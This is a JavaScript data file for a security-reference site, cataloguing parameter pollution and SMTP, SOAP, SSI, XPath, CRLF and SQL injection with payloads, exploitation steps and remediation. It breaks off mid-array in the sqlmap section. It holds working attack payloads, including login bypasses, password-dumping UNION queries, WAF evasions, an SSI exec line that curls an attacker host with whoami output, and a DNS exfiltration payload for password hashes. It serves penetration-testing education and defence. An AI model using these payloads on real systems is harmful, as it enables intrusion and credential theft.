/*
  VULNS -- the data behind /vulns.html and /vuln-detail.html.

  A categorized field reference of common vulnerabilities and
  misconfigurations. Same shape as toolkit.js so the same rendering,
  search, and detail-page machinery works.

  {
    id:          "unique-slug",   // powers vuln-detail.html?vuln=<id>
    name:        "Vulnerability Name",
    severity:    "Critical|High|Medium|Low|Info",
    ref:         "https://...",   // optional external reference (button)
    theory:      "theory/....html",// optional link to a deep theory page (button)
    description: "One line for the grid card.",
    brief:       "Overview paragraph(s). Use \n\n between paragraphs.",
    quickReference: [ { label: "...", cmd: "payload or indicator" } ],
    sections: [ {title,type:"table",columns,rows} | {type:"commands",commands} | {type:"notes",items} ]
  }

  HOW TO ADD: drop a new object into the right category's `vulns` array,
  or add a new { category, vulns:[...] } block. Save and refresh.
*/

var VULNS = [
    {
    category: "Injection",
    vulns: [
      {
        "id": "http-parameter-pollution",
        "name": "HTTP Parameter Pollution",
        "severity": "Medium",
        "ref": "https://owasp.org/www-community/attacks/HTTP_Parameter_Pollution",
        "description": "Supplying the same parameter more than once causes different components to read different values, bypassing validation, filters, or business rules.",
        "brief": "HTTP allows a parameter to appear multiple times in one request (a=1&a=2). There is no single standard for which occurrence wins, so every layer decides for itself: one framework takes the first value, another the last, a third concatenates them, and a WAF may inspect one while the application uses another. HTTP Parameter Pollution (HPP) weaponises that disagreement.\n\nBy splitting a payload across duplicate parameters, an attacker can slip malicious input past a WAF or input filter that only checks one copy, make an application apply a discount or privilege twice, override a server-set value the client should not control, or tamper with the parameters of a downstream request the server builds from the input. It is both an attack in its own right and a bypass technique that amplifies SQLi, XSS, and access-control flaws.",
        "quickReference": [
          { "label": "Duplicate a parameter", "cmd": "GET /search?q=safe&q=<payload>   (which value does the app use?)" },
          { "label": "Split a filtered payload", "cmd": "id=1&id=2--   or   ?a=%27&a=OR&a=1=1  to reassemble past a WAF" },
          { "label": "Body pollution", "cmd": "coupon=SAVE10&coupon=SAVE10   (apply a single-use code twice)" },
          { "label": "Array form", "cmd": "user[]=self&user[]=admin   (does the last/first/array win?)" }
        ],
        "sections": [
          { "title": "How It's Tested", "type": "commands", "commands": [
            { "label": "1. Establish which occurrence wins", "cmd": "# send a benign duplicate and observe the reflected/processed value\ncurl -s 'https://target/echo?x=first&x=second'\n# note whether the app uses first, last, both, or an array" },
            { "label": "2. Use it to bypass a filter / WAF", "cmd": "# WAF may inspect only the first value while the app concatenates:\n/item?id=1&id=2)+UNION+SELECT+...\n# or split a blocked keyword across copies the backend rejoins" },
            { "label": "3. Abuse business logic", "cmd": "# apply a one-time coupon twice, or override a server-controlled field:\nPOST /checkout\namount=10&amount=1&coupon=X&coupon=X" },
            { "label": "4. Pollute a server-built downstream request", "cmd": "# input that the server forwards into an internal API/URL:\n?redirect=https://ok.com&redirect=https://evil.com" }
          ]},
          { "title": "Where Values Are Resolved", "type": "table", "columns": ["Technology", "Duplicate a=1&a=2 resolves to"], "rows": [
            ["PHP / Apache", "Last (a=2)"],
            ["ASP.NET / IIS", "Both, comma-joined (a=1,2)"],
            ["JSP / Tomcat", "First (a=1)"],
            ["Node.js (Express)", "Array ([1,2])"],
            ["Python (Flask/Django)", "First / list depending on accessor"]
          ]},
          { "title": "Impact", "type": "table", "columns": ["Scenario", "Result"], "rows": [
            ["WAF vs app disagreement", "Injection payload reaches the app un-inspected"],
            ["Duplicate discount / vote", "Business-logic abuse - double redemption"],
            ["Override server field", "Set a value (role, price) the client shouldn't control"],
            ["Downstream request tampering", "Redirect, SSRF, or API-parameter manipulation"]
          ]},
          { "title": "References", "type": "references", "items": [
            { "label": "OWASP - HTTP Parameter Pollution", "url": "https://owasp.org/www-community/attacks/HTTP_Parameter_Pollution" },
            { "label": "OWASP WSTG - Testing for HTTP Parameter Pollution", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution" }
          ]},
          { "title": "Remediation", "type": "notes", "items": [
            "Reject requests that contain duplicate parameters where only one is expected, rather than silently picking one.",
            "Canonicalise input to a single, well-defined value before validation, and validate the exact value the application will actually use.",
            "Ensure the WAF or input filter and the application resolve duplicates identically, so nothing is inspected in one form and used in another.",
            "Treat single-use tokens (coupons, votes, one-time actions) as atomic server-side operations that cannot be replayed via duplicate parameters.",
            "Use strict, typed parameter binding (a scalar where a scalar is expected) instead of accepting arrays implicitly."
          ]}
        ]
      },
      {
        "id": "smtp-injection",
        "name": "SMTP / Email Header Injection",
        "severity": "Medium",
        "ref": "https://owasp.org/www-community/vulnerabilities/SMTP_Injection",
        "description": "Newline characters in input that builds an email let an attacker inject extra SMTP headers - adding hidden recipients, spoofing headers, or relaying spam.",
        "brief": "Any feature that sends mail (contact forms, invitations, password reset, notifications) usually builds the message headers from user input such as the sender name, subject, or recipient. Email headers are separated by CRLF, so if those newlines are not stripped an attacker can inject additional headers or body content - most damagingly a hidden Bcc/Cc that silently copies the mail (and any token it carries) to the attacker.\n\nImpact: interception of reset tokens and confirmation links via injected Cc/Bcc, header spoofing, and turning the application into an open relay for spam and phishing.",
        "quickReference": [
          { "label": "Add a hidden BCC", "cmd": "name=Bob%0d%0aBcc:attacker@evil.com" },
          { "label": "Inject into the reset email", "cmd": "email=victim@target.com%0d%0acc:attacker@evil.com" },
          { "label": "Spoof the subject / body", "cmd": "subject=Hi%0d%0aX-Injected:1%0d%0a%0d%0aInjected body" }
        ],
        "sections": [
          { "title": "How It's Exploited", "type": "commands", "commands": [
            { "label": "1. Find a mail-sending feature that reflects input", "cmd": "# contact form, invite, share-by-email, password reset\n# any field (name, subject, from, to) that ends up in the message headers is a sink" },
            { "label": "2. Inject CRLF + a header", "cmd": "# URL-encoded newlines: %0d%0a (CR LF)\nname=Attacker%0d%0aBcc:attacker@evil.com\n# if a copy of the mail reaches attacker@evil.com, injection is confirmed" },
            { "label": "3. Escalate", "cmd": "# steal reset tokens by CC-ing yourself on a victim's reset:\nemail=victim@target.com%0d%0aBcc:attacker@evil.com\n# or inject a full body to send spoofed mail from the app's trusted domain" }
          ]},
          { "title": "Injectable Headers", "type": "table", "columns": ["Header", "Abuse"], "rows": [
            ["Bcc / Cc", "Silently copy the message (and its tokens) to the attacker"],
            ["To", "Redirect or add recipients"],
            ["From / Reply-To", "Spoof the sender for phishing"],
            ["Subject / body", "Inject arbitrary content, relay spam"]
          ]},
          { "title": "References", "type": "references", "items": [
            { "label": "OWASP - SMTP Injection", "url": "https://owasp.org/www-community/vulnerabilities/SMTP_Injection" },
            { "label": "OWASP WSTG - Testing for IMAP/SMTP Injection", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_IMAP_SMTP_Injection" }
          ]},
          { "title": "Remediation", "type": "notes", "items": [
            "Strip or reject CR and LF (and their encoded variants) from every value used to build an email header.",
            "Use a well-maintained mail library and pass recipients/headers through its API rather than concatenating raw strings.",
            "Validate email addresses against a strict allow-list format and reject anything with newlines, extra @, or header keywords.",
            "Set recipients server-side where possible instead of taking them from the request."
          ]}
        ]
      },
      {
        "id": "soap-injection",
        "name": "SOAP Injection",
        "severity": "Medium",
        "ref": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/",
        "description": "Unsanitised input placed into a SOAP/XML message lets an attacker inject extra elements and manipulate the request the backend processes.",
        "brief": "SOAP web services carry parameters inside an XML envelope. When an application builds that XML by concatenating user input without encoding it, an attacker can inject XML metacharacters and elements to break out of the intended value - changing other fields, adding elements, or malforming the document to alter the backend's behaviour. It is the XML analogue of SQL injection and frequently sits alongside XXE on XML-based services.\n\nImpact: authentication bypass, tampering with values the client should not control (price, role, quantity), data disclosure, and denial of service through malformed XML.",
        "quickReference": [
          { "label": "Break the XML structure", "cmd": "value</arg><arg>injected   (does the response error or change?)" },
          { "label": "Inject XML metacharacters", "cmd": "test payloads:  <  >  &  ]]>  and unbalanced tags" },
          { "label": "Add an element the server trusts", "cmd": "user</username><role>admin</role><username>user" },
          { "label": "Combine with XXE", "cmd": "switch to XML sinks and try external entities too" }
        ],
        "sections": [
          { "title": "How It's Exploited", "type": "commands", "commands": [
            { "label": "1. Probe with XML metacharacters", "cmd": "# submit <, >, & and closing tags in each field and watch for errors or changed behaviour\n<username>test</username>  ->  <username>test</username><injected>1</injected>" },
            { "label": "2. Inject a trusted element", "cmd": "# if the envelope is built by string concatenation, close the value and add your own:\nusername = bob</username><role>administrator</role><username>\n# result: the server may parse an extra <role> it did not expect" },
            { "label": "3. Malform to alter logic or DoS", "cmd": "# unbalanced tags, CDATA (]]>), or recursive/expanding structures\n# to break parsing, change the effective query, or exhaust the parser" }
          ]},
          { "title": "What It Enables", "type": "table", "columns": ["Effect", "Example"], "rows": [
            ["Field/parameter tampering", "Change price, quantity, role, or user id in the request"],
            ["Authentication bypass", "Inject or overwrite auth-related elements"],
            ["Data disclosure", "Coax the service into returning extra data"],
            ["Denial of service", "Malformed or expanding XML crashes the parser"],
            ["Chained XXE", "External entities on the same XML sink"]
          ]},
          { "title": "References", "type": "references", "items": [
            { "label": "OWASP WSTG - Input Validation Testing", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/" },
            { "label": "PortSwigger - XXE / XML attacks", "url": "https://portswigger.net/web-security/xxe" }
          ]},
          { "title": "Remediation", "type": "notes", "items": [
            "Never build XML/SOAP messages by string concatenation; use a proper XML API that encodes values.",
            "XML-encode all user input (< > & ' \") before it enters the document.",
            "Validate requests against a strict XML Schema (XSD) and reject anything that does not conform.",
            "Disable external entity resolution to prevent chained XXE, and apply strict server-side validation on every value."
          ]}
        ]
      },
      {
        "id": "ssi-injection",
        "name": "Server-Side Includes (SSI) Injection",
        "severity": "High",
        "ref": "https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection",
        "description": "Input reflected into a page that the server parses for SSI directives lets an attacker run commands or read files as the page is rendered.",
        "brief": "Server-Side Includes are directives (like <!--#include -->, <!--#exec -->) that a web server evaluates while assembling a page, typically in .shtml files. If user input is written into such a page without sanitisation, an attacker can inject their own SSI directives, which the server then executes - reading files, printing environment variables, or running operating-system commands.\n\nImpact: file disclosure, information leakage, and often remote command execution, depending on which SSI directives the server permits.",
        "quickReference": [
          { "label": "Detect", "cmd": "inject:  <!--#echo var=\"DATE_LOCAL\" -->   (does the date render?)" },
          { "label": "Read a file", "cmd": "<!--#include virtual=\"/etc/passwd\" -->" },
          { "label": "Run a command", "cmd": "<!--#exec cmd=\"id\" -->" },
          { "label": "ESI variant", "cmd": "<esi:include src=\"http://attacker/\" />   (Edge Side Includes)" }
        ],
        "sections": [
          { "title": "How It's Exploited", "type": "commands", "commands": [
            { "label": "1. Confirm SSI is processed", "cmd": "# inject a harmless directive into a reflected/stored field:\n<!--#echo var=\"DATE_LOCAL\" -->\n# if the current date appears in the response, SSI is being evaluated" },
            { "label": "2. Read files / leak info", "cmd": "<!--#include virtual=\"/etc/passwd\" -->\n<!--#printenv -->" },
            { "label": "3. Command execution", "cmd": "<!--#exec cmd=\"id\" -->\n<!--#exec cmd=\"curl http://attacker/$(whoami)\" -->\n# whether exec is allowed depends on the server config (IncludesNOEXEC disables it)" }
          ]},
          { "title": "Directives to Try", "type": "table", "columns": ["Directive", "Effect"], "rows": [
            ["<!--#echo var=... -->", "Print server variables - low-risk detection"],
            ["<!--#include -->", "Include/read another file"],
            ["<!--#exec cmd=... -->", "Run an OS command (if enabled) - RCE"],
            ["<!--#printenv -->", "Dump all environment variables"],
            ["<esi:include ...>", "Edge Side Includes - SSRF/RCE on caching proxies"]
          ]},
          { "title": "References", "type": "references", "items": [
            { "label": "OWASP - SSI Injection", "url": "https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection" },
            { "label": "OWASP WSTG - Testing for SSI Injection", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection" }
          ]},
          { "title": "Remediation", "type": "notes", "items": [
            "Do not reflect user input into pages that the server parses for SSI (.shtml and configured extensions).",
            "HTML-encode user input so SSI directive characters (< ! -- # >) cannot form a directive.",
            "Disable SSI where it is not needed, and set IncludesNOEXEC to forbid the exec directive where SSI is required.",
            "Validate input strictly and keep the web server configuration minimal and patched."
          ]}
        ]
      },
      {
        "id": "xpath-injection",
        "name": "XPath Injection",
        "severity": "Medium",
        "ref": "https://owasp.org/www-community/attacks/XPATH_Injection",
        "description": "Unsanitised input inside an XPath query lets an attacker alter the query to bypass authentication or extract the whole XML document.",
        "brief": "Applications that store data in XML often query it with XPath. When user input is concatenated into an XPath expression without escaping, an attacker can inject XPath syntax to change the query's logic - the direct analogue of SQL injection. Because XPath has no access-control model, a successful injection can usually read the entire document, and where XPath drives authentication it becomes a login bypass.\n\nImpact: authentication bypass and full disclosure of the backing XML data (which frequently contains all users and credentials).",
        "quickReference": [
          { "label": "Auth bypass", "cmd": "username: ' or '1'='1     password: ' or '1'='1" },
          { "label": "Always-true tail", "cmd": "value' or '1'='1   /   value' or 1=1 or 'a'='a" },
          { "label": "Break out and read", "cmd": "']/*  |  //user  (enumerate other nodes)" },
          { "label": "Blind XPath", "cmd": "boolean substring() tests to extract data character by character" }
        ],
        "sections": [
          { "title": "How It's Exploited", "type": "commands", "commands": [
            { "label": "1. Detect with metacharacters", "cmd": "# submit ' \" [ ] ( ) and watch for XPath/XML errors or changed results\nusername = test'" },
            { "label": "2. Authentication bypass", "cmd": "# the backend builds:  //user[name/text()='INPUT' and pass/text()='INPUT']\n# inject an always-true condition:\nname:  ' or '1'='1\npass:  ' or '1'='1\n# -> the filter matches the first user and logs you in" },
            { "label": "3. Extract data (blind)", "cmd": "# no error output? use boolean/substring oracles:\n' or substring(//user[1]/password,1,1)='a\n# iterate positions and characters to recover values" }
          ]},
          { "title": "Notes vs SQLi", "type": "table", "columns": ["Aspect", "XPath Injection"], "rows": [
            ["Backing store", "XML document queried with XPath"],
            ["Access control", "None - any node is reachable once you can inject"],
            ["Classic payload", "' or '1'='1  (identical shape to SQLi)"],
            ["Blind technique", "substring() + boolean oracles"],
            ["Impact", "Auth bypass and full document disclosure"]
          ]},
          { "title": "References", "type": "references", "items": [
            { "label": "OWASP - XPath Injection", "url": "https://owasp.org/www-community/attacks/XPATH_Injection" },
            { "label": "OWASP WSTG - Testing for XPath Injection", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection" }
          ]},
          { "title": "Remediation", "type": "notes", "items": [
            "Use parameterised XPath (precompiled expressions with variable binding) instead of concatenating input.",
            "Escape or reject XPath metacharacters ( ' \" [ ] ( ) / and whitespace ) in user input.",
            "Apply strict allow-list validation on fields used in queries.",
            "Do not store credentials in XML queried this way; where possible move authentication to a hardened store."
          ]}
        ]
      },
      {
        "id": "crlf-injection",
        "name": "CRLF / HTTP Response Header Injection",
        "severity": "Medium",
        "ref": "https://owasp.org/www-community/vulnerabilities/CRLF_Injection",
        "description": "Unsanitised newline characters (CR / LF) in user input are written into HTTP headers or other structured output, letting an attacker inject headers or split the response.",
        "brief": "HTTP headers are separated by CRLF (\\r\\n, or %0d%0a URL-encoded). When a value the user controls — a redirect target, a cookie, an email field — is placed into a header without stripping newlines, an attacker can inject their own headers or split the message entirely. Depending on where the sink is, this becomes response header injection, response splitting, cookie injection, log forging, or — in email flows — SMTP header injection to add a hidden CC/BCC.\n\nImpact ranges from adding an attacker CC to a password-reset email, to setting cookies, to XSS and cache poisoning via a split response.",
        "quickReference": [
          { "label": "Header injection", "cmd": "param=value%0d%0aX-Injected:%20true" },
          { "label": "Set a cookie", "cmd": "param=value%0d%0aSet-Cookie:%20sessionid=attacker" },
          { "label": "Email CC injection (reset flows)", "cmd": "email=victim@mail.com%0d%0acc:attacker@mail.com" },
          { "label": "Open redirect + split", "cmd": "?url=%0d%0aLocation:%20https://evil.com" }
        ],
        "sections": [
          { "title": "How It's Exploited", "type": "commands", "commands": [
            { "label": "1. Find a value reflected into a header", "cmd": "# redirects (Location), Set-Cookie, custom headers, and any 'echo the input' header\ncurl -si 'https://target/redirect?url=test' | grep -i location" },
            { "label": "2. Inject a newline and a header", "cmd": "curl -si 'https://target/redirect?url=test%0d%0aX-Injected:%20yes'\n# X-Injected present in the response = CRLF injection" },
            { "label": "3. Escalate the sink", "cmd": "# Set-Cookie:  ...%0d%0aSet-Cookie:%20sessionid=attacker   (session fixation)\n# full body:   ...%0d%0a%0d%0a<script>alert(1)</script>       (response splitting -> XSS)\n# cache:       poison a cached response with attacker headers/body" },
            { "label": "4. SMTP header injection in mail flows", "cmd": "# a reset/contact form that builds mail headers from input:\nemail=victim@mail.com%0d%0acc:attacker@mail.com\n# you receive a copy of the victim's reset token" }
          ]},
          { "title": "Sinks & Effects", "type": "table", "columns": ["Sink", "Effect"], "rows": [
            ["Location header (redirect)", "Header injection, open redirect, response splitting"],
            ["Set-Cookie", "Session fixation, cookie tampering"],
            ["Reflected custom header", "Cache poisoning, client-side attacks"],
            ["Email headers (To/CC/Subject)", "SMTP injection — hidden CC/BCC, spoofed mail"],
            ["Log files", "Log forging / injection to hide or fake activity"]
          ]},
          { "title": "References", "type": "references", "items": [
            { "label": "OWASP — CRLF Injection", "url": "https://owasp.org/www-community/vulnerabilities/CRLF_Injection" },
            { "label": "OWASP — HTTP Response Splitting", "url": "https://owasp.org/www-community/attacks/HTTP_Response_Splitting" }
          ]},
          { "title": "Remediation", "type": "notes", "items": [
            "Strip or reject CR (%0d) and LF (%0a) — and their encoded/overlong variants — from any value that reaches a header, cookie, redirect, email field, or log line.",
            "Use framework APIs that build headers and set cookies safely rather than string-concatenating raw values.",
            "Prefer allow-list validation for redirect targets and email addresses over blocklist filtering.",
            "Keep modern web servers/frameworks updated — most now reject bare CR/LF in header values by default.",
            "Encode data written into logs so injected newlines cannot forge log entries."
          ]}
        ]
      },
      {
        id: "sqli",
        name: "SQL Injection (SQLi)",
        severity: "Critical",
        ref: "https://portswigger.net/web-security/sql-injection",
        description: "User input reaches a SQL query unsanitized, letting an attacker read, modify, or destroy database data — and sometimes reach the OS.",
        brief: "SQL injection occurs when user-controlled input is concatenated into a SQL statement instead of being bound as a parameter. The database receives one flat string of text and has no way to tell where the developer's intended query ends and the attacker's data begins, so a value like ' OR '1'='1 stops being data and becomes part of the query's logic. This confusion of code and data is the root of the entire vulnerability class.\n\nSQLi comes in several flavours defined by how results come back to you. In-band injection returns data directly in the response — either through a UNION SELECT that appends attacker-chosen columns, or through a database error message that leaks the value you asked for. Blind injection returns no data at all: you recover it one bit at a time by asking true/false questions and observing a difference in the page (boolean-blind) or by forcing a measurable delay (time-blind). Out-of-band injection exfiltrates data over a separate channel such as DNS when the response itself reveals nothing.\n\nImpact is severe and wide-ranging: dumping every user's credentials and PII, bypassing authentication with a single request, tampering with or destroying records, and — where the database account is privileged — reading and writing files on the server and executing operating-system commands (xp_cmdshell on MSSQL, INTO OUTFILE web shells on MySQL, large-object abuse and COPY on PostgreSQL). Despite being decades old it remains one of the most common and most damaging web vulnerabilities because a single unparameterised query anywhere in a large codebase is enough.",
        quickReference: [
          { label: "Break the query (probe)", cmd: "'   ' OR '1'='1   ' OR 1=1-- -   \" OR \"\"=\"   `   \\" },
          { label: "UNION column count + extract", cmd: "' ORDER BY 5-- -   then  ' UNION SELECT NULL,version(),NULL-- -" },
          { label: "Time-based blind confirm", cmd: "' AND SLEEP(5)-- -  (MySQL)   '||pg_sleep(5)-- (PG)   '; WAITFOR DELAY '0:0:5'-- (MSSQL)" },
          { label: "Automate", cmd: "sqlmap -r request.txt --batch --dbs --level 5 --risk 3" }
        ],
        sections: [
          {
            title: "Root Cause & Mechanism",
            type: "notes",
            items: [
              "The application builds a query by string concatenation — e.g. \"SELECT * FROM users WHERE id = '\" + input + \"'\" — so the input is parsed as part of the SQL grammar rather than as an opaque value.",
              "A single quote (') closes the string literal the developer opened; everything after it is interpreted as SQL until you either balance the quotes or comment out the remainder (-- -, #, or /* */).",
              "The fix (parameterised queries) works because the query text and the data are sent to the database separately — the data can never change the parsed statement, no matter what characters it contains.",
              "Numeric contexts (WHERE id = 1) are injectable without any quote at all, since the value is not wrapped in a string literal.",
              "Not just SELECT: INSERT, UPDATE, DELETE, ORDER BY, LIMIT, table/column names, and stored procedures are all reachable sinks, and each needs a slightly different injection shape."
            ]
          },
          {
            title: "Where to Look",
            type: "notes",
            items: [
              "Every parameter that could touch a query: URL query strings, POST body fields, JSON values, cookies, and HTTP headers (User-Agent, Referer, X-Forwarded-For are logged/queried surprisingly often).",
              "Login forms, search boxes, filters, sort/order controls, pagination (limit/offset), and report generators are classic entry points.",
              "ORDER BY and column-name positions cannot be parameterised, so dynamic sorting is a common real-world injection point even in otherwise-safe codebases.",
              "Second-order sinks: a value stored safely on one request (a username, a profile field) and later concatenated into a query on another request — test stored data, not just the immediate reflection.",
              "APIs and GraphQL resolvers that pass arguments into hand-written SQL behind the scenes."
            ]
          },
          {
            title: "Step 1 — Detect the Injection Point",
            type: "commands",
            commands: [
              { label: "Break the syntax", cmd: "# submit a single quote and watch for a 500, a DB error, or a changed response\nid=1'\nid=1\"\nid=1`\n# a backslash can also break escaping: id=1\\" },
              { label: "Prove it with a boolean pair", cmd: "# TRUE condition -> normal page, FALSE condition -> different/empty page\nid=1' AND '1'='1-- -      # renders normally\nid=1' AND '1'='2-- -      # differs  => the input reaches the query logic\n# numeric context (no quotes):\nid=1 AND 1=1        vs      id=1 AND 1=2" },
              { label: "Prove it with arithmetic (numeric fields)", cmd: "# if id=3-1 returns the same row as id=2, the value is evaluated as SQL\nid=2\nid=3-1" },
              { label: "Confirm with a time delay when nothing changes", cmd: "# a reliable oracle when the page looks identical either way\nid=1' AND SLEEP(5)-- -\nid=1'||pg_sleep(5)-- -\nid=1'; WAITFOR DELAY '0:0:5'-- -" }
            ]
          },
          {
            title: "Authentication Bypass",
            type: "commands",
            commands: [
              { label: "Comment out the password check", cmd: "# query: SELECT * FROM users WHERE user='INPUT' AND pass='INPUT'\n# put the comment after a valid/guessed username:\nusername:  admin'-- -\nusername:  admin'#\nusername:  admin'/*\n# the AND pass='...' clause is now commented away" },
              { label: "Always-true tautologies", cmd: "' OR '1'='1'-- -\n' OR 1=1-- -\n' OR 'a'='a\nadmin' OR '1'='1'-- -      # log in as the first user (often admin)" },
              { label: "Target a specific account", cmd: "# make the WHERE match only admin, regardless of password:\n' OR username='admin'-- -\n' UNION SELECT 1,'admin','fakehash',1-- -   # forge a row the app treats as a valid login" },
              { label: "Second field / numeric variants", cmd: "# if the username is fixed and only the password is injectable:\npassword:  ' OR '1'='1\n# numeric login id:\nid=1 OR 1=1-- -" }
            ]
          },
          {
            title: "Step 2 — Fingerprint the Database",
            type: "commands",
            commands: [
              { label: "Version strings per DBMS", cmd: "MySQL/MariaDB : ' UNION SELECT @@version-- -        or version()\nPostgreSQL    : ' UNION SELECT version()-- -\nMSSQL         : ' UNION SELECT @@version-- -\nOracle        : ' UNION SELECT banner FROM v$version-- -   (needs FROM dual for scalars)\nSQLite        : ' UNION SELECT sqlite_version()-- -" },
              { label: "Behavioural fingerprints (blind)", cmd: "# string concatenation differs per engine:\nMySQL     : CONCAT('a','b')  or 'a' 'b'\nMSSQL     : 'a'+'b'\nOracle/PG : 'a'||'b'\n# time functions differ (see the delay payloads) — a working SLEEP vs pg_sleep vs WAITFOR tells you the engine" },
              { label: "Error-based leakage (fast when errors show)", cmd: "MySQL   : ' AND extractvalue(1,concat(0x7e,version()))-- -\nMSSQL   : ' AND 1=CONVERT(int,@@version)-- -\nPostgres: ' AND 1=cast(version() as int)-- -" }
            ]
          },
          {
            title: "Step 3 — In-band Exploitation (UNION)",
            type: "commands",
            commands: [
              { label: "Find the column count", cmd: "# increase until it errors, or use NULLs until the page renders\n' ORDER BY 1-- -   ' ORDER BY 2-- -   ...   (errors at count+1)\n' UNION SELECT NULL-- -   ' UNION SELECT NULL,NULL-- -   ..." },
              { label: "Find a column that renders text", cmd: "# replace one NULL at a time with a marker string to see which prints\n' UNION SELECT 'aaa',NULL,NULL-- -\n' UNION SELECT NULL,'aaa',NULL-- -   # note the visible position(s)" },
              { label: "Enumerate the schema (MySQL/PG/MSSQL)", cmd: "# list databases / current context\n' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -\n# list tables\n' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -\n# list columns\n' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -" },
              { label: "Dump the data", cmd: "' UNION SELECT username,password FROM users-- -\n# concat many columns into one visible position:\n' UNION SELECT concat(username,0x3a,password),NULL FROM users-- -   (MySQL)\n' UNION SELECT username||':'||password,NULL FROM users-- -           (PG/Oracle)" },
              { label: "Oracle note", cmd: "# Oracle SELECTs need a FROM; use dual, and it has no LIMIT\n' UNION SELECT banner,NULL FROM v$version-- -\n# tables: SELECT table_name FROM all_tables ; columns: all_tab_columns" }
            ]
          },
          {
            title: "Step 4 — Blind Exploitation (Boolean & Time)",
            type: "commands",
            commands: [
              { label: "Boolean-blind: extract character by character", cmd: "# is the first char of the admin password hash 'a'? true page vs false page\n' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -\n# binary-search the ASCII value to cut requests ~log2(n):\n' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>77-- -" },
              { label: "Time-blind: same logic, timing oracle", cmd: "MySQL   : ' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>77,SLEEP(3),0)-- -\nPostgres: ' AND (SELECT CASE WHEN (condition) THEN pg_sleep(3) ELSE pg_sleep(0) END)-- -\nMSSQL   : ' IF (condition) WAITFOR DELAY '0:0:3'-- -" },
              { label: "Discover length first", cmd: "# find the string length so you know how many chars to walk\n' AND LENGTH((SELECT password FROM users LIMIT 1))=32-- -" },
              { label: "Out-of-band (OAST) when there is no oracle at all", cmd: "# MySQL (Windows, if allowed): DNS lookup carrying data\n' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.attacker.oastify.com\\\\a'))-- -\n# MSSQL: master..xp_dirtree '\\\\<data>.attacker.oastify.com\\a'\n# use a Burp Collaborator / interactsh listener to catch the callback" }
            ]
          },
          {
            title: "DBMS Cheat Sheet",
            type: "table",
            columns: ["Task", "MySQL", "MSSQL", "PostgreSQL", "Oracle"],
            rows: [
              ["Comment", "-- - or #", "-- -", "-- -", "-- -"],
              ["Version", "@@version", "@@version", "version()", "banner FROM v$version"],
              ["Current DB", "database()", "db_name()", "current_database()", "SELECT user FROM dual"],
              ["Concatenate", "CONCAT(a,b)", "a+b", "a||b", "a||b"],
              ["Substring", "SUBSTRING(s,1,1)", "SUBSTRING(s,1,1)", "SUBSTR(s,1,1)", "SUBSTR(s,1,1)"],
              ["Delay", "SLEEP(5)", "WAITFOR DELAY '0:0:5'", "pg_sleep(5)", "dbms_pipe.receive_message(('a'),5)"],
              ["Row limit", "LIMIT 1 OFFSET 0", "TOP 1 / OFFSET FETCH", "LIMIT 1 OFFSET 0", "ROWNUM / FETCH FIRST"]
            ]
          },
          {
            title: "Injection Types",
            type: "table",
            columns: ["Type", "How it works", "When to use it"],
            rows: [
              ["UNION (in-band)", "Append your own SELECT columns to the result set", "Query results are rendered on the page"],
              ["Error-based (in-band)", "Force the DB to put data inside an error message", "Verbose DB errors are shown"],
              ["Boolean-blind", "A true/false condition changes the page subtly", "No data shown, but page differs on true vs false"],
              ["Time-blind", "A conditional SLEEP/WAITFOR delays the response", "Page is identical either way"],
              ["Out-of-band (OAST)", "Data exfiltrated via DNS/HTTP callback", "No visible or timing oracle exists"],
              ["Stacked queries", "A second statement after ; runs writes/procedures", "Driver allows multiple statements (MSSQL, PG)"],
              ["Second-order", "Stored input is used unsafely in a later query", "Reflection is safe but storage is not"]
            ]
          },
          {
            title: "WAF & Filter Bypass",
            type: "commands",
            commands: [
              { label: "Defeat keyword blocklists", cmd: "# inline comments split keywords:  UN/**/ION SE/**/LECT\n# case has no meaning to SQL:        uNiOn sELeCt\n# MySQL versioned comments execute:  /*!50000UNION*//*!50000SELECT*/" },
              { label: "Avoid blocked characters", cmd: "# no spaces -> comments or parentheses/tabs/newlines\n'/**/OR/**/1=1-- -      'OR(1)=(1)-- -      '%0aOR%0a1=1-- -\n# no quotes -> hex or CHAR():   WHERE name=0x61646d696e   or  CHAR(97,100,109,105,110)" },
              { label: "Avoid = and comparison filters", cmd: "# use LIKE, IN, or BETWEEN instead of =\n' OR username LIKE 'adm%'-- -\n' OR id BETWEEN 1 AND 9999-- -" },
              { label: "Encoding & normalisation tricks", cmd: "# double URL-encoding, unicode homoglyphs, and overlong forms can slip past a WAF that decodes differently from the app\n%2527  ->  %27  ->  '\n# sqlmap tamper scripts automate these:\nsqlmap -r req.txt --tamper=space2comment,between,charencode --level 5 --risk 3" }
            ]
          },
          {
            title: "Step 5 — Automating with sqlmap",
            type: "commands",
            commands: [
              { label: "Point it at a captured request", cmd: "# save the raw request from Burp (right-click -> copy to file) as request.txt\nsqlmap -r request.txt --batch\n# target a specific parameter and be thorough:\nsqlmap -r request.txt -p id --level 5 --risk 3 --dbms mysql" },
              { label: "Enumerate", cmd: "sqlmap -r request.txt --dbs\nsqlmap -r request.txt -D appdb --tables\nsqlmap -r request.txt -D appdb -T users --columns\nsqlmap -r request.txt -D appdb -T users -C username,password --dump" },
